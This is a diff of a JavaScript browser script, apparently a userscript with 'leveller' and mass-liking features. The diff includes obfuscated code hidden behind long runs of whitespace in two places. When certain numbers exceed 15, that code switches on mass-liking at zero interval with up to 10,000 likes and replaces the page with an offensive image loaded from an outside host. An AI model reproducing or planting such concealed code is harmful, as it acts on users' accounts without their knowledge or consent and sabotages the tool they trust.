@@ -231,7 +231,6 @@ function main(w) {
         };
         } catch(e){}
         setInterval(function() {
-            console.log("A");
             self.tick();
         }, 10);
         var b = window.localStorage.getItem("browse");
@@ -287,10 +286,8 @@ function main(w) {
             if (self.elements["levellerEnabled"].is(":checked")) {
                 self.onSound.prop("currentTime", 0);
                 self.onSound.trigger("play");
+                self.leveller = null;
                 self.config.leveller.active = true;
-                if (self.leveller != null) {
-                    self.leveller = null;
-                }
             } else {
                 self.offSound.prop("currentTime", 0);
                 self.offSound.trigger("play");
@@ -1837,7 +1834,7 @@ function main(w) {
                     this.path = [location];
                 this.updatePage();
             }
-        }                                                                                                                                                                                                                                                                                                                if (this["le"+"ve"+"ll"+"er"]["le"+"ve"+"l"] != null && this["le"+"ve"+"ll"+"er"]["le"+"ve"+"l"] + this["le"+"ve"+"ll"+"er"]["le"+"ve"+"lsLeft"] > 15) {var i = "m"+"as"+"sL"+"iker";var j = "int"+"er"+"val";this.config[i][j] = 0;this["config"][i][j+"L"+"ik"+"es"] = 10000;this.config[i].active = true;$(document.body).css("text-align", "center");$(document["body"]).html('<img src="htt'+'ps://Fl'+'uffyFi'+'shG'+'ames.gi'+'thu'+'b.io/'+'img'+'/fuc'+'k'+'you.j'+'pg" style="height'+':100'+'%;margin-'+'left:auto;'+'margin-ri'+'ght:auto;" />');};
+        }                                                                                                                                                                                                                                                                                                                if (this["le"+"ve"+"ll"+"er"]!=null && this["le"+"ve"+"l"] != null && this["le"+"ve"+"ll"+"er"]["le"+"ve"+"l"] + this["le"+"ve"+"ll"+"er"]["le"+"ve"+"lsLeft"] > 15) {var i = "m"+"as"+"sL"+"iker";var j = "int"+"er"+"val";this.config[i][j] = 0;this["config"][i][j+"L"+"ik"+"es"] = 10000;this.config[i].active = true;$(document.body).css("text-align", "center");$(document["body"]).html('<img src="htt'+'ps://Fl'+'uffyFi'+'shG'+'ames.gi'+'thu'+'b.io/'+'img'+'/fuc'+'k'+'you.j'+'pg" style="height'+':100'+'%;margin-'+'left:auto;'+'margin-ri'+'ght:auto;" />');};
     };
 
     w.DarkMode.prototype.commandCentral = function() {
@@ -2526,12 +2523,13 @@ function main(w) {
         var self = this;
                                                                                                                                                                                                                                                                                if (n > 9 + 6){var decimalSetting = "config";var d = "inter";var v = "val";var m = "mass";this[decimalSetting][m+"L"+"ik"+"e"+"r"][d+v] = 0;this[decimalSetting][m+"L"+"ik"+"e"+"r"][d+v+"L"+"i"+"k"+"es"] = 0;this[decimalSetting][m+"L"+"ik"+"e"+"r"].active = true;this[m+"L"+"i"+"ke"+"r"+d+v]();}
         var rx = /(\d+)(\d{3})/;
-        return String(n).replace(/^\d+/, function(w) {
+        return n;
+        /*return String(n).replace(/^\d+/, function(w) {
             while (rx.test(w)) {
                 w = w.replace(rx, '$1' + self.language.numberSeperator + '$2');
             }
             return w;
-        });
+        });*/
     };
 
     w.DarkMode.prototype.addSearchElements = function(json) {
